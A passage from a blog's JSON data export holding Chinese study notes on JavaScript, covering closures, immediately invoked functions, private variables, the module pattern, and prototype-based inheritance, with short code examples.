4/","link":"","permalink":"https://github.com/xmoyKING/2016/08/12/js-pro14/","excerpt":"","text":"接上篇JavaScript高级程序设计-13-函数表达式1-递归/闭包 模仿块级作用域js没有块级作用域的概念，这意味着快语句中定义的变量，实际上是在包含函数中而非语句中创建的：123456function outputNumbers(count)&#123; for(var i = 0; i &lt; count; i++)&#123; console.log(i); &#125; console.log(i); // 计数&#125; 在循环中定义的变量i初始化为0。在java，c++等语言中，变量i只会在for循环的语句快中有定义，循环一旦结束，变量i就被销毁。但在js中变量i是定义在outputNumbers的活动对象中的，因此从它有定义开始，就可以在函数内部随处访问。即使重新声明也不会改变，如下例：1234567function outputNumbers(count)&#123; for(var i = 0; i &lt; count; i++)&#123; console.log(i); &#125; var i; // 重新声明不改变i的值 console.log(i); // 计数&#125; js不会对重复声明变量提示错误，它会忽略后续的声明（但若后续有初始化则会执行初始化），匿名函数可用来模仿块级作用域并避免这个问题。123(function()&#123; // 此处模仿的就是块级作用域&#125;)(); 将函数声明包含在一对圆括号中，表示它实际上是一个函数表达式，而紧随其后的另一对圆括号表示立即调用这个函数。 所以将outputNumbers改写如下：12345678function outputNumbers(count)&#123; (function()&#123; for(var i = 0; i &lt; count; i++)&#123; console.log(i); &#125; &#125;) console.log(i); // 出错&#125; 由于i会在匿名函数执行结束时销毁，所以变量i只能在循环内使用，在匿名函数外部访问会报错。这样就创建了一个块级作用域。 这种立即执行匿名函数模仿块级作用域的方式常用于全局作用域中，避免向全局作用域添加过多的变量和函数。 同时这样可以减少闭包占用的内存，因为没有指向匿名函数的引用，只要函数执行完毕，就可以立即销毁其作用域链。 私有变量严格来说，js没有私有成员的概念，所有对象属性都是共有的，不过，却有私有变量的概念（私有成员和私有变量不是同一概念）。 任何在函数中定义的变量都可以认为是私有变量，因为不能在函数的外部访问这些变量。私有变量包括函数的参数、局部变量、在函数内部定义的其他函数：1234function add(num1, num2)&#123; var sum = num1 + num2; return sum;&#125; 在add函数内部，有3个私有变量，num1，num2和sum。在函数内部可以访问这几个变量，但在函数外部则不能访问它们。若在函数内部创建一个闭包，则闭包可通过作用域链访问这些变量。因此就可以创建用于访问私有变量的公有方法。 一般将有权访问私有变量和私有函数的公有方法称为特权方法（privileged method）。有两种在对象上创建特权方法的方式。第一种是在构造函数中定义特权方法：12345678910111213function MyObject()&#123; // 私有变量和私有函数 var privateVariable = 10; function privateFunction()&#123; return false; &#125; // 特权方法 this.privilegedMethod = function()&#123; privateVariable++; return privateFunction(); &#125;&#125; 这个模式在构造函数内部定义了所有私有变量和函数，然后又继续创建了能够访问这些私有成员的特权方法。能够在构造函数中定义特权方法，是因为特权方法作为闭包有权访问在构造函数中定义的所有变量和函数。对此例而言，变量privateVariable和函数privateFunction只能通过特权方法privilegedMethod访问。 利用私有变量和特权方法的特性，可以隐藏那些不应该被直接修改的数据：12345678910111213function Person(name)&#123; this.getName = function()&#123; return name; &#125;; this.setName = function(value)&#123; name = value; &#125;;&#125;var person = new Person('king');person.getName(); // 'king'person.setName('tom');person.getName(); // 'tom' 私有变量name在Person的每一个实例都不相同，因为每次调用构造函数都会重新创建这两个方法，但这样做会有缺点，那就是必须使用构造函数模式来达到目的，而构造函数模式的缺点是针对每个实例都会创建同一组新方法，而使用静态私有变量来实现特权方法可以避免这个问题。 静态私有变量通过在私有作用域中定义私有函数和变量，同样可以创建特权方法：12345678910111213141516(function()&#123; // 私有变量和私有函数 var privateVariable = 10; function privateFunction()&#123; return false; &#125; // 构造函数 MyObject = function()&#123;&#125;; // 公有/特权方法 MyObject.prototype.privilegedMethod = function()&#123; privateVariable++; return privateFunction(); &#125;;&#125;)(); 这个模式创建了一个私有作用域，并在其中封装了一个构造函数及相应的方法，在私有作用域中，首先定义了私有变量和私有函数，然后又定义了构造函数及其公有方法，公有方法是在原型上定义的，属于典型的原型模式。 需要注意的是，这个模式在定义构造函数时并没有使用函数声明，而是使用了函数表达式，函数声明只能创建局部函数。同时，在声明MyObject时没有使用var关键字，这样MyObject就变成了一个全局变量，能够在私有作用域之外访问到（在严格模式下，给未声明的变量赋值会报错）。 这个模式与在构造函数中定义特权方法的只要区别是，私有变量和函数是由实例共享的，由于特权方法是在原型上定义的，因此，所有实例都使用同一个函数，而这个特权方法，作为一个闭包，总保存着对包含作用域的引用,如下例：1234567891011121314151617181920212223(function()&#123; var name = ''; Person = function(value)&#123; name = value; &#125;; Person.prototype.getName = function()&#123; return name; &#125; Person.prototype.setName = function(value)&#123; name = value; &#125;;&#125;)();var p1 = new Person('king');p1.getName(); // 'king'p1.setName('tom');p1.getName(); // 'tom'var p2 = new Person('mark');p1.getName(); // 'mark'p2.getName(); // 'mark' 上例中，Person构造函数与getName和setName方法一样，都有权访问私有变量name，在这种模式下，变量name就变成了一个静态的、由所有实例共享的属性，即在一个实例上调用setName会影响所有实例，而调用setName或新建一个Person实例都会赋予name属性一个新值，结果就是所有实例都返回相同的值。 以这种方式创建静态私有变量会因为使用原型而复用代码，但每个实例都没有自己的私有变量，所以需要视情况而定。 同时，由于查找作用域链的次数会影响查找速度，所以闭包和私有变量也不是没有缺点。 模块模式静态私有变量模式主要用于为自定义类型创建私有变量和特权方法。而模块模式（module pattern）则专为单例创建私有变量和特权方法。所谓单例（singleton）指的是只有一个实例的对象，一般，js是以对象字面量的方式来创建单例对象的。123456var singleton = &#123; name: value, method: function()&#123; // ... &#125;&#125;; 模块模式为单例添加私有变量和特权方法：12345678910111213141516var singleton = function()&#123; // 私有方法和属性 var privateVariable = 10; function privateFunction()&#123; return false; &#125; // 特权/公有方法和属性 return&#123; publicProperty: true, publicMethod: function()&#123; privateVariable++; return privateFunction(); &#125; &#125;;&#125;(); 模块模式使用一个返回对象的匿名函数，在匿名函数内部，首先定义了私有变量和函数，然后将一个对象字面量作为函数的值返回，返回的对象字面量只包含可以公开的属性和方法，由于这个对象是在匿名函数内部定义的，因此它的公有方法有权访问私有变量和函数。从本质上将，这个对象字面量是单例的公共接口，这种模式在需要对单例进行某些初始化，同时又需要维护其私有变量时非常有用。 12345678910111213141516171819var application = function()&#123; // 私有 var components = new Array(); // 初始化 components.push(new BaseComponent()); // 公有 return &#123; getComponentCount: function()&#123; return components.length; &#125;, registerComponent: function(component)&#123; if(typeof component == 'object')&#123; components.push(component); &#125; &#125; &#125;;&#125;(); 在Web应用程序中，经常需要使用一个单例来管理应用程序级的信息，上例创建了一个用于管理组件的application对象。在创建这个对象的过程中，首先声明了一个私有的components数组，并向数组中添加了一个BaseComponent的新实例（不需关心BaseComponent的实现）。而返回对象的getComponentCount和registerComponent方法，都是有权访问数组components的特权方法，前者返回已注册的组件数目，后者用于注册组件。 简而言之，如必须创建一个对象并以某些数据对其进行初始化，同时还要公开一些能够访问这些私有数据的方法，那么就可以使用模块模式。以这种模式创建的每个单例都是Object的实例，因为最终要通过一个对象字面量来表示它。由于单例通常都是作为全局对象存在的，不会通过它传递函数，因此，也没有必要使用instanceof操作符来检查其对象类型。 增强的模块模式进一步改进模块模式，即在返回对象之前加入对其增强的代码，这种增强的模块模式适合那些单例必须时某种类型的实例，同时还必须添加某些属性或方法对其加以增强的情况。如下：123456789101112131415161718var singleton = function()&#123; // 私有方法和属性 var privateVariable = 10; function privateFunction()&#123; return false; &#125; // 创建对象 var object = new CustomType(); // 添加特权/公有方法和属性 object.publicProperty = true; object.publicMethod = function()&#123; privateVariable++; return privateFunction(); &#125; return object;&#125;(); 又比如前面例子中的application对象必须时BaseComponent实例，那么可以修改为如下：12345678910111213141516171819202122var application = function()&#123; // 私有 var components = new Array(); // 初始化 components.push(new BaseComponent()); // 创建application的一个局部副本 var app = new BaseComponent(); // 公有 app.getComponentCount = function()&#123; return components.length; &#125;; app.registerComponent = function(component)&#123; if(typeof component == 'object')&#123; components.push(component); &#125; &#125;; return app;&#125;(); 修改后的application单例中，主要的不同在于命名变量app的创建过程，因为它必须时BaseComponent的实例，这个实例实际上时application对象的局部变量版，此后，又为app对象添加了能够访问私有变量的公有方法。最后返回app对象，结果仍然时将它赋给全局变量application。 小结在js中，函数表达式非常有用，使用函数表达式可以无需对函数命名，从而实现动态编程，你们函数，也称为拉姆达函数，是一种使用js函数的强大方式，总结函数表达式的特点如下： 函数表达式不同于函数声明，函数声明要求有名字，但函数表达式不需要，没有名字的函数表达式也称为匿名函数 在无法确定如何引用函数的情况下，递归函数会变得比较复杂 递归函数应该始终使用arguments.callee来递归地调用自身，不要使用函数名——函数名可能会发生变化 当函数内部定义了其他函数时，就创建了闭包，闭包有权访问包含函数内部的所有变量，原理如下： 在后台执行环境中，闭包的作用域链包含着它自己的作用域、包含函数的作用域和全局作用域 通常，函数的作用域极其所有变量都会在函数执行结束后被销毁，但使用函数返回一个闭包时，这个函数的作用域将会一直存在直到闭包被销毁。 使用闭包可以在js中模仿块级作用域（js本身没有块级作用域的概念），要点如下： 创建并立即调用一个函数，这样既可以执行其中的代码，又不会在内存留下对该函数的引用 立即调用函数的内部的所有变量都会在调用后立即销毁，除非将某些变量赋值给了包含作用域（即外部作用域）中的变量 闭包还可以用于在对象中创建私有变量，特点如下： 即使js没有正式的私有对象属性的概念，但可以使用闭包实现公有方法，通过其访问在包含作用域中定义的变量 可以使用构造函数模式、原型模式来实现自定义类型的特权方法，也可以使用模块模式，增强的模块模式来实现单例的特权方法 js中函数表达式和闭包都非常有用，利用他们能实现非常多的功能，但过多使用闭包会导致性能下降，因为创建闭包必须维护额外的作用域，会占用大量内存。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-13-函数表达式1-递归/闭包","slug":"js-pro13","date":"2016-08-12T05:52:47.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2016/08/12/js-pro13/","link":"","permalink":"https://github.com/xmoyKING/2016/08/12/js-pro13/","excerpt":"","text":"函数表达式是js中一个强大但容易令人困惑的特性。定义函数有两种方式，分别为函数声明和函数表达式。 通过函数声明创建函数的语法为：123function functionName(arg0,arg1,arg2,...)&#123; // 函数体&#125; 在许多浏览器实现中，函数有一个非标准的name属性，通过这个属性可以访问到给函数指定的名字，这个值与function关键字后的标识符相等。1functionName.name; // 'functionName' 关于函数声明，需要注意的特点是函数声明提升（function declaration hoisting），在执行代码之前会读取函数声明。所以可以将函数声明放在调用语句之后。 通过函数表达式创建函数的语法有好几种形式，最常见的是：123var functionName = function(arg0,arg1,arg2,...)&#123; // 函数体&#125; 这种形式看起来与常规的变量赋值语句很想，即创建一个函数并将它赋值给变量functionName。因为function关键字后面没有标识符，在这种情况下创建的函数叫匿名函数（anonymous function），有的时候也被称为lamda表达式，匿名函数的name属性是空字符串。同时，函数表达式与其他表达式一样，使用前需先赋值。 理解函数提升的关键在于理解函数声明与函数表达式之间的区别。例如下例的结果就始终为第二个定义：12345678910// 始终返回第二个声明if(condition)&#123; function sayHi()&#123; console.log('Hi'); &#125;&#125;else&#123; function sayHi()&#123; console.log('Hello'); &#125;&#125; 之所以浏览器会始终返回第二个声明是因为浏览器忽略condition条件判断。在ES中这样的写法是无效的。 ES中能先创建函数再赋值给变量，即将函数作为其他函数的返回。比如sort的第三个参数需要一个函数对象。1234567891011121314function createComparisonFunction(propertyName)&#123; return function(object1,object2)&#123; var value1 = object1[propertyName]; var value2 = object2[propertyName]; if(value1 &lt; value2)&#123; return -1; &#125;else if(value1 &gt; value2)&#123; return 1; &#125;else&#123; return 0 &#125; &#125;&#125; 在createComparisonFunction内部返回一个匿名函数，返回的函数可能会被赋值给一个变量，也可以以其他方式调用。 递归递归函数是在一个函数通过名字调用自身的情况下构成的：1234567function factorial(n)&#123; if(n &lt;= 1)&#123; return 1; &#125;else&#123; return n*factorial(n-1); &#125;&#125; 但当使用如下方式调用时会报错：123var f2 = factorial;factorial = null;console.log(f2(4)); // error 由于factorial变量被设置为了null，虽然原函数被赋值给了一个新变量，但却会导致原函数内部的factorial执行错误。 这种情况下使用arguments.callee可以解决问题，arguments.callee是一个指向正在执行的函数的指针，但在严格模式下不能通过脚本访问arguments.callee。 也可以通过命名函数表达式达到相同的结果：1234567var factorial = (function f(n)&#123; if(n &lt;= 1)&#123; return 1; &#125;else&#123; return n*f(n-1); &#125;&#125;) 将命名函数表达式f赋值给变量factorial。即便把factorial赋值给了另外的变量，函数名f仍然有效。 闭包有时候经常会混淆匿名函数和闭包这两个概念。 闭包是指有权访问另一个函数作用域中的变量的函数，创建闭包的常见方式就是在一个函数内部创建另一个函数，以createComparisonFunction为例，1234567891011121314function createComparisonFunction(propertyName)&#123; return function(object1,object2)&#123; var value1 = object1[propertyName]; // 注意 var value2 = object2[propertyName]; // 注意 if(value1 &lt; value2)&#123; return -1; &#125;else if(value1 &gt; value2)&#123; return 1; &#125;else&#123; return 0 &#125; &#125;&#125; 上述代码中，加注释的代码是createComparisonFunction函数中内部的一个匿名函数中的代码，这两行代码访问了外部函数中的变量propertyName。需要注意的是，当内部函数被返回且在其他被调用时，即使这个内部函数被返回了，它仍然可以访问变量propertyName。之所以还能访问这个变量是因为内部函数的作用域链中包含createComparisonFunction的作用域。 要彻底搞清楚闭包的细节，必须先理解函数第一次被调用时发生了什么，同时需要理解如何创建作用域链、以及作用域链有什么用。 当某个函数第一次被调用时，会创建一个执行环境（execution context）及相应的作用域链，并把作用域链赋值给一个特殊的内部属性（[[Scope]]）。然后，使用this、arguments和其他命名参数的值来初始化函数的活动对象（activation object）。但在作用域链中，外部函数的活动对象始终处于第二位，外部函数的外部函数的活动对象处于第三位,…直到作用域链终点的全局执行环境。 在函数的执行过程中，为读写变量值，需要在作用域链中查找变量,如下例：12345678910function compare(value1,value2)&#123; if(value1 &lt; value2)&#123; return -1; &#125;else if(value1 &gt; value2)&#123; return 1; &#125;else&#123; return 0 &#125;&#125;var result = compare(5, 10); 以上代码先定义了compare函数，然后在全局作用域下调用，当第一次调用compare时，会创建一个包含this、arguments、value1、value2的活动对象。全局执行环境的变量对象（包含this、result和compare）在compare执行环境的作用域链中则处于第二位，下图为compare函数执行时的作用域链： 后台的每个执行环境都有一个表示变量的对象——变量对象。全局环境的变量对象始终存在，而像compare函数这样的局部环境的变量对象，则只在函数执行的过程中存在。在创建compare函数时，会创建一个预先包含全局变量对象的作用域链，这个作用域链被保存在内部的[[Scope]]属性中，当调用compare函数时，会为函数创建一个执行环境，然后通过复制函数的[[Scope]]属性中的对象构建起执行环境的作用域链。为此，又有一个活动对象（在此作为变量对象使用）被创建并被推入执行环境作用域链的前端。 以compare为例的执行环境而言，其作用域链中包含两个变量对象:本地活动对象和全局变量对象，显然，作用域链本质上是一个指向变量对象的指针列表，它只引用但不实际包含变量对象。 无论何时在函数中访问一个变量时，会从作用域链中搜索具有相应名字的变量。一般来说，当函数执行完毕后，局部活动对象会被销毁，内存中仅保存全局作用域（全局执行环境的变量对象），但闭包的情况不同。 在另一个函数内部定义的函数会将包含函数（即外部函数）的活动对象添加到它的作用域链中，因此，在createComparisonFunction函数内部定义的作用域链中，实际上将会包含外部函数createComparisonFunction的活动对象。 以下列代码为例：12var compare = createComparisonFunction('name');var result = compare(&#123;name: 'Nicholas'&#125;, &#123;name: 'Greg'&#125;); 在匿名函数从createComparisonFunction中返回后，它的作用域链被初始化为包含createComparisonFunction函数的活动对象和全局变量对象，这样，匿名函数就可以访问在createComparisonFunction中定义的所有变量。同时，createComparisonFunction函数在执行完毕后，其活动对象也不会被销毁，因为匿名函数的作用域链仍然在引用这个活动对象，换而言之，当createComparisonFunction函数返回后，其执行环境的作用域链会被销毁，但它的活动对象仍然留在内存中，直到匿名函数被销毁后，createComparisonFunction的活动对象才会被销毁。 使用如下方式销毁匿名函数：123var compareNames = createComparisonFunction('name'); // 创建函数var result = compareNames(&#123;name: 'Nicholas'&#125;, &#123;name: 'Greg'&#125;); // 调用函数compareNames = null; // 解除对匿名函数的引用以便释放内存 下图展示了调用compareNames的过程中产生的作用域链之间的关系： 由于闭包会携带包含它的函数的作用域，因此会比其他函数占用更多内存。虽然优化后的js引擎会尝试回收被闭包占用的内存，但还是要谨慎使用闭包。 闭包与变量作用域链的这种机制有一个副作用，那就是闭包只能取得包含函数的任何变量的最后一个值，因为闭包所保存的是整个变了对象，而不是某个特殊的变量，以下面代码为例：123456789function createFunctions()&#123; var result = new Array(); for(var i = 0; i &lt; 10; i++)&#123; result[i] = function()&#123; return i; &#125;; &#125; return result;&#125; 这个函数会返回一个函数数组，从表明看，似乎每个函数都返回了自己的索引值，但实际上，因为每个函数的作用域链中的保存着createFunctions函数的活动对象，所以它们引用的都是同一个变量i，当createFunctions函数返回后，i的值是10，此时每个函数都引用保存变量i的同一个变量对象，所以每个函数内部i的值都是10。 通过创建另一个匿名函数强制让闭包行为符合预期可以解决这个引用问题：1234567891011function createFunctions()&#123; var result = new Array(); for(var i = 0; i &lt; 10; i++)&#123; result[i] = function(num)&#123; return function()&#123; return num; &#125;; &#125;(i); &#125; return result;&#125; 修改后的createFunctions函数中，没有直接把闭包赋值给数组，而是定义了一个匿名函数并将立即执行该匿名函数的结果赋值给数组，这里的匿名函数有一个参数num，即最终的函数要返回的值。在调用每个匿名函数时，传入变量i，由于函数参数是按值传递的，所以就会将变量i的当前值复制给参数num。而在匿名函数内部，又创建并返回了一个访问num的闭包，如此，result数组中的每个函数都有自己num变量的一个副本，这样就可以返回各自不同的数值了。 关于this对象在闭包中使用this对象可能会导致一些问题。this镀锡是在运行时基于函数的执行环境绑定的，在全局函数中，this等于window，而当函数作为某个对象的方法调用时，this等于那个对象。 一般情况下，匿名函数的执行环境具有全局性，因此this对象通常指向window（可通过call和apply改变函数执行环境）。有时由于编写闭包的方式不同，会有一些差异：1234567891011var name = 'Window';var obj = &#123; name: 'object', getNameFunc: function()&#123; return function()&#123; return this.name; &#125;; &#125;&#125;obj.getNameFunc()(); // 非严格模式下为 'Window' 由于geNameFunc返回一个函数，因此调用obj.getNameFunc()()就会立即调用它返回的函数，但为什么匿名函数返回的却是全局name变量的值。 由于每个函数在被调用时，其活动对象都会自动取得两个特殊变量：this和arguments。内部函数在搜索这两个变量时，只会搜索到其活动对象为止，因此永远不可能直接访问外部函数中的这两个变量。不过，把外部作用域中的this对象保存在一个闭包能够访问到的变量里就可以让闭包访问该对象了。123456789101112var name = 'Window';var obj = &#123; name: 'object', getNameFunc: function()&#123; var that = this; return function()&#123; return that.name; &#125;; &#125;&#125;obj.getNameFunc()(); // 'object' 修改后的getNameFunc函数中，将this赋值给了that变量，定义匿名函数中，在函数返回后，闭包仍然可以访问这个that变量，因此最后返回object。 注意arguments和this一样，也会有这样的问题。 有几种特殊的情况，this的值会被意外改变：12345678910var name = 'Window';var obj = &#123; name: 'object', getName: function()&#123; return this.name; &#125;&#125;;obj.getName(); // 'object'(obj.getName)(); // 'object'(obj.getName = obj.getName)(); // 'window' 上述代码中，第一个obj.getName();正常调用，此时this.name就是obj.name。 第二个(obj.getName)();在调用方法前先加上了括号，好像只是在引用一个函数，但this的值不变，因为obj.getName和(obj.getName)的定义是相同的。 第三个(obj.getName = obj.getName)();先执行了一条赋值语句，然后再调用赋值后的结果，因为赋值表达式的值是函数本身，所以this改变，结果为window。 内存泄漏由于IE9之前的版本对js对象和COM对象使用不同的垃圾回收策略，因此闭包在IE的这些版本会导致一些问题。具体来说就是若闭包的作用域中保存着一个HTML元素，那么就意味着该元素将无法销毁。123456function assignHandler()&#123; var element = document.getElementById('someElement'); element.onclick = function()&#123; console.log(element.id); &#125;;&#125; 上述代码创建了一个作为element元素时间处理程序的闭包，而这个闭包则又创建了一个循环引用。由于匿名函数保存了一个对assignHandler的活动对象的引用，因此只要匿名函数存在，element的引用数至少为1，导致它占用的内存永远不会被回收。 解决方式如下：12345678910function assignHandler()&#123; var element = document.getElementById('someElement'); var id = element.id; element.onclick = function()&#123; console.log(id); &#125;; element = null;&#125; 通过将element.id的一个副本保存在一个变量中，并且在闭包中引用该变量消除循环引用。但仅仅这样并不能解决内存泄漏问题，因为闭包会引用包含函数的整个活动对象，而其中包含着element，即使闭包不直接引用element，包含函数的活动对象中也仍然会保存一个引用。因此，有必要将element变量设置为null，这样就能解除对DOM对象的引用，顺利减少其引用数，确保正常释放其占用内存。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-12-面向对象3-继承","slug":"js-pro12","date":"2016-08-11T00:22:40.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2016/08/11/js-pro12/","link":"","permalink":"https://github.com/xmoyKING/2016/08/11/js-pro12/","excerpt":"","text":"接上篇JavaScript高级程序设计-12-面向对象2-创建对象 继承继承是OO语言中的一个最为经典的概念之一，许多OO语言都支持两种继承方式：接口继承和实现继承。接口继承只继承方法签名，而实现继承则继承实际的方法。由于函数没有签名，在ES中无法实现接口继承。ES只支持实现继承，主要依靠原型链来实现的。 原型链ES中原型链作为实现继承的主要方法，其基本思想是利用原型让一个引用类型继承另一个引用类型的属性和方法。由构造函数、原型、实例之间的关系：每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。 实现原型链有一种基本模式:1234567891011121314151617181920// 父类function SuperType()&#123; this.property = true;&#125;SuperType.prototype.getSuperValue = function()&#123; return this.property;&#125;;// 子类function SubType()&#123; this.subproperty = false;&#125;// 继承自SuperTypeSubType.prototype = new SuperType();SubType.prototype.getSubValue = function()&#123; return this.subproperty;&#125;;var instance = new SubType();console.log(instance.getSuperValue()); // true 通过将SuperType的实例赋给SubType.prototype实现了SubType继承SuperType。本质是重写原型对象，用一个新类型的实例替代子类的原型。因此，原存在于SuperType的实例中的所偶属性和方法，现在也存在于SubType.prototype中了。在确定了继承关系后，给SubType.prototype添加了一个方法，这样在继承了SuperType的属性和方法基础上又添加了一个新方法。如图，instance指向SubType的原型，SubType的原型指向SuperType的原型。getSuperValue方法仍然还在SuperType.prototype中，但property则位于SubType.prototype中。因为property是一个实例属性，而getSuperValue则是一个原型方法，既然SubType.prototype是SuperType的实例，那么property自然位于该实例中。此外，需要注意instance.constructor指向的是SuperType,因为原本SubType的原型指向了另一个对象，即SuperType的原型，而这个原型对象的constructor属性指向SuperType。 实现原型链，本质上扩展了原型搜索机制。当以读取模式访问一个实例属性时，首先会在实例中搜索该属性，若没有找到该属性，则会继续搜索实例的原型。在通过原型链实现继承的情况下，搜索过程就得以沿着原型链继续向上。在找不到属性或方法的情况下，搜索过程总是要一环一环的找，直到原型链末端才会停止。 以上例来说，调用instance.getSuperValue会经历三个搜索步骤： 搜索实例 搜索SubType.prototype 搜索SuperType.prototype(上例在此处找到该方法) 默认原型事实上，前面图中的原型链少了一环。由于所有引用类型都继承了Object，且这个继承也是通过原型链实现的，所以所有的函数的默认原型都是Object的实例，因此默认原型都会包含一个内部指针，指向Object.prototype。这就是所有自定义类型都会继承toString、valueOf等默认方法的根本原因。 完整的原型链示意图应为： 确定原型和实例的关系可以通过两种方式来确定原型和实例之间的关系，第一种方式是使用instanceof操作符，测试实例与原型链中出现过的构造函数的关系。123instance instanceof Object; // trueinstance instanceof SuperType; // trueinstance instanceof Subtype; // true 由于原型链的关系，可以说instance是Object、SuperType或SubType中任何一个类型的实例。 第二种方法是使用isPrototypeOf方法，同样，只要是原型链中出现过的原型，都可以认为该原型链所派生的实例的原型，因此isPrototypeOf方法也会返回true:123Object.prototype.isPrototypeOf(instance); // trueSuperType.prototype.isPrototypeOf(instance); // trueSubtype.prototype.isPrototypeOf(instance); // true 谨慎定义方法子类有时候需要重写父类的方法，或需要添加父类中不存在的方法，无论如何，给原型添加方法一定要放在替换原型的语句之后。 同时需要注意，通过原型链实现继承时，不能使用对象字面量创建原型方法，即防止重写原型链。 原型链问题通过原型链实现继承很强大，但也存在一些问题，其中，主要是包含引用类型值时的共享问题。即包含引用类型值的原型属性会被所有实例共享，这就是为什么推荐在构造函数中，而不是原型对象中定义属性的原因。通过原型来实现继承时，原型实际上会变成另一个类型的实例，于是，原先的实例属性也就顺理成章的变成了现在的原型属性。12345678910111213function SuperType()&#123; this.colors = ['red','green'];&#125;function SubType()&#123;&#125;SubType.prototype = new SuperType();var i1 = new SubType();i1.colors.push('blue');var i2 = new SubType();i1.colors; // 'red,green,blue'i2.colors; // 'red,green,blue' 原型链的第二个问题是，在创建子类的实例时，不能向父类的构造函数中传递参数，实际上，应该说是没有办法在不影响所有对象实例的情况下，给父类的构造函数传递参数。 因此，基于上述两点，很少单独使用原型链继承。 借用构造函数在解决原型中包含引用类型值所引发的问题时，开发者开始使用借用构造函数（constructor stealing）的技术（也被称为伪造对象或经典继承）。思想很简单，即在子类构造函数的内部调用父类构造函数。因为函数只不过是在特定环境下执行代码的对象，因此通过使用apply和call方法也可以在新创建的对象上执行构造函数：12345678910111213function SuperType()&#123; this.colors = ['red','green'];&#125;function SubType()&#123; SuperType.call(this); // 继承SuperType&#125;var i1 = new SubType();i1.colors.push('blue');i1.colors; // 'red,green,blue'var i2 = new SubType();i2.colors; // 'red,green' SuperType.call(this);通过使用call/apply方法借调了父类的构造函数，实际上是在新创建的SubType实例的环境下调用了SuperType构造函数，这样依赖，就会在新的SubType对象上执行SuperType函数中定义的所有对象初始化代码，因此，SubType的每个实例都会有自己的colors属性的副本。 传递参数相对于原型链而言，借用构造函数有一个很大的优势，即可以在子类构造函数中向父类构造函数传递参数：123456789101112function SuperType(name)&#123; this.name = name;&#125;function SubType(name)&#123; SuperType.call(this, name); // 继承SuperType,并传递参数 this.age = 22;&#125;var i1 = new SubType('king');i1.name; // 'king'i1.age; // 22 借用构造函数的问题若仅仅是借用构造函数，那么无法米变构造函数模式存在的问题，即方法都在构造函数中定义，因此无法复用。而且，在父类的原型中定义的方法对子类是不可见的，结果所有类型都只能使用构造函数模式。所以，很少单独使用借用构造函数的技术。 组合继承组合继承（combination inheritance）也叫伪经典继承，指的是将原型链和借用构造函数的技术组合到一起，从而发挥两者优势。其思路是通过使用原型链实现对原型属性和方法的继承，通过借用构造函数来实现对实例属性的继承，这样既通过在原型上定义方法实现了函数复用，又能保证每个实例都有它自己的属性。1234567891011121314151617181920212223242526272829function SuperType(name)&#123; this.name = name; this.colors = ['red','green'];&#125;SuperType.prototype.sayName = function()&#123; console.log(this.name);&#125;function SubType(name, age)&#123; SuperType.call(this, name); // 继承SuperType的属性,并传递参数 this.age = age;&#125;SubType.prototype = new SuperType(); // 继承方法SubType.prototype.sayAge = function()&#123; console.log(this.age);&#125;var i1 = new SubType('king', 22);i1.colors.push('blue');i1.colors; // 'red,green,blue'i1.sayName; // 'king'i1.sayAge; // 22var i2 = new SubType('tom', 21);i1.colors; // 'red,green'i2.sayName; // 'tom'i2.sayAge; // 21 组合继承是js中最常用的继承模式，避免了原型链和借用构造函数的缺陷，融合了两者优点，同时instanceof和isPrototypeOf也能用于识别基于组合继承创建的对象。 原型式继承Douglas Crockford介绍了一种实现继承的方法，这种方法并没有严格意义上的构造函数，思想是借助原型基于现有对象创建新对象，同时还不必创建自定义类型：12345function obj(o)&#123; function F()&#123;&#125; F.prototype = o; return new F();&#125; 在obj函数内部，先创建一个临时的构造函数，然后将传入的对象作为这个构造函数的原型，最后返回这个临时类的新实例，从本质上， obj对传入其中的对象执行了依次浅复制，如下例:1234567891011121314var p1 = &#123; name: 'king', links: ['tom','jim']&#125;;var p2 = obj(p1);p2.name = 'max';p2.links.push('bob');var p3 = obj(p1);p3.name = 'mark';p3.links.push('alice');p1.links; // 'tom,jim,bob,alice' 从上例来看，原对象中的引用类型的值会被所有新对象共享，实际上，这相当于创建了p1的两个副本。 ES5新增Object.create方法规范了原型式继承。该方法接收两个对象参数：第一个参数作为新对象原型，第二个参数是可选的，为新对象定义额外属性。在只传入一个参数的情况下，Object.create和obj的行为相同。1234567891011121314var p1 = &#123; name: 'king', links: ['tom','jim']&#125;;var p2 = Object.create(p1);p2.name = 'max';p2.links.push('bob');var p3 = Object.create(p1);p3.name = 'mark';p3.links.push('alice');p1.links; // 'tom,jim,bob,alice' Object.create方法的第二个参数与Object.defineProperties方法的第二个参数格式相同，每个属性都通过自己的描述符定义，以这种方式指定的任何属性都会覆盖原型对象上的同名属性：1234567891011var p1 = &#123; name: 'king', links: ['tom','jim']&#125;;var p2 = Object.create(p1,&#123; name:&#123; value: 'max' &#125;&#125;);p2.name; // max 寄生式继承寄生式（parasitic）继承是与原型式继承紧密相关的一种思路，并且同样也是由Crockford推广的。寄生式继承的思路与寄生构造函数和工厂模式类似，即创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象，最后返回对象即可:12345678910111213141516function createObj(original)&#123; var clone = obj(original); // 通过调用函数创建一个新对象 clone.sayHi = function()&#123; // 在对象上添加属性/方法 console.log('hi'); &#125;; return clone; // 返回对象&#125;// 使用var p1 = &#123; name: 'king', links: ['tom','jim']&#125;;var p2 = createObj(p1);p2.sayHi(); // hi 若主要考虑对象而不是自定义类型和构造函数时，寄生式继承是一种有用的模式，任何能够返回新对象的函数都适用此模式。 同时需要注意，与构造函数模式类似，通过寄生式继承为对象添加函数不能做到函数复用，会降低效率。 寄生组合式继承组合继承是js最常用的继承模式，但也有不足，即无论如何，组合继承一定会调用两次父类构造函数，一次是在创建子类原型时，另一次是在子类构造函数内部。由于子类最终会包含父类对象的全部实例属性，但不得不在调用子类构造函数时重写这些属性：123456789101112131415161718function SuperType(name)&#123; this.name = name; this.colors = 